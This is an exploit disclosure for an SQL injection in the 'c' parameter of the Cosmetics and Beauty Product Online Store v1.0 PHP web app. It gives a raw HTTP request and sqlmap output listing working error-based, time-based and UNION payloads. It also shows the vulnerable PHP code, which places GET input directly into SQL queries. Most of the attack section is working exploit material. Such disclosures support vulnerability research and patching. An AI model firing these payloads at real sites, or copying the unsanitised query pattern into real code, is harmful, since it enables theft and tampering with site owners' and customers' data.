# Exploit Title: Cosmetic and Beauty Products Online Shop 1.0 - SQL Injection list Product by Categogy

The c parameter on category detail on Cosmetics-and-Beauty-Product-Online-Store v1.0 appears to be vulnerable to SQL injection attacks. 

### Date: 
> 15 Apr 2023

### Author: 
> tht1997
### Vendor Homepage:
> https://www.sourcecodester.com
### Software Link:
> [Cosmetics and Beauty Product Online Store](https://www.sourcecodester.com/php/15181/cosmetics-and-beauty-product-online-store-phpoop-free-source-code.html)
### Version:
> v 1.0

# Tested On: Windows 10, XAMPP

### Affected Page:
> products.php


### Description:
> The c parameter on product list with category on Cosmetics-and-Beauty-Product-Online-Store v1.0 appears to be vulnerable to SQL injection attacks. 

### Proof of Concept:
> Following steps are involved:
1. Visit the vulnerable page: cbpos/?p=products&c=CATEGORY_ID_VULN
2. Copy request to a txt file and run with SQLmap
Request
```
GET /cbpos/?p=products&c=eccbc87e4b5ce2fe28308fd9f2a7baf3 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: eid=2; download_started=0; plupload_ui_view=thumbs; PowerBB_username=tuanth; PowerBB_password=32298fc135b3fecf012a4c27efbba188; jstree_select=1; PHPSESSID=51spndcudrtniksvqgp19cifo8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

3. Result
```
GET parameter 'c' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
---
Parameter: c (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: p=products&c=eccbc87e4b5ce2fe28308fd9f2a7baf3' AND EXTRACTVALUE(7991,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(7991=7991,1))),0x7170627871)) AND 'IQJK'='IQJK

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=products&c=eccbc87e4b5ce2fe28308fd9f2a7baf3' AND (SELECT 8334 FROM (SELECT(SLEEP(5)))ngZL) AND 'fKtY'='fKtY

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: p=products&c=-5011' UNION ALL SELECT NULL,CONCAT(0x71626a7871,0x416d6f47445a4778426b6d4f4744504a554d797064556a556b6e7975647077775576495658534b4e,0x7170627871),NULL,NULL,NULL,NULL-- -
---
[13:44:04] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.0, Apache 2.4.54
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
```
4. CODE
```
<?php 
$title = "";
$sub_title = "";
if(isset($_GET['c']) && isset($_GET['s'])){
    $cat_qry = $conn->query("SELECT * FROM categories where md5(id) = '{$_GET['c']}'");
    if($cat_qry->num_rows > 0){
        $result =$cat_qry->fetch_assoc();
        $title = $result['category'];
        $cat_description = $result['description'];
    }
 $sub_cat_qry = $conn->query("SELECT * FROM sub_categories where md5(id) = '{$_GET['s']}'");
    if($sub_cat_qry->num_rows > 0){
        $result =$sub_cat_qry->fetch_assoc();
        $sub_title = $result['sub_category'];
        $sub_cat_description = $result['description'];
    }
}
elseif(isset($_GET['c'])){
    $cat_qry = $conn->query("SELECT * FROM categories where md5(id) = '{$_GET['c']}'");
    if($cat_qry->num_rows > 0){
        $result =$cat_qry->fetch_assoc();
        $title = $result['category'];
        $cat_description = $result['description'];
    }
}
elseif(isset($_GET['s'])){
    $sub_cat_qry = $conn->query("SELECT * FROM sub_categories where md5(id) = '{$_GET['s']}'");
    if($sub_cat_qry->num_rows > 0){
        $result =$sub_cat_qry->fetch_assoc();
        $sub_title = $result['sub_category'];
        $sub_cat_description = $result['description'];
    }
}
$brands = isset($_GET['b']) ? json_decode(urldecode($_GET['b'])) : array();
?>
```

5. Successful exploit screenshots are below (with c parameter)
![Example Image](https://drive.google.com/uc?id=1j819OF-D97Ip-0HBUmteNjdq-0fXBhsg)


Video POC here:
[POC SQLi_HERE](https://drive.google.com/file/d/1oqfgM0g4mffP6lnxj0nnp8eAo9qpDsfL/view?usp=sharing)

### Impact:
> A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.
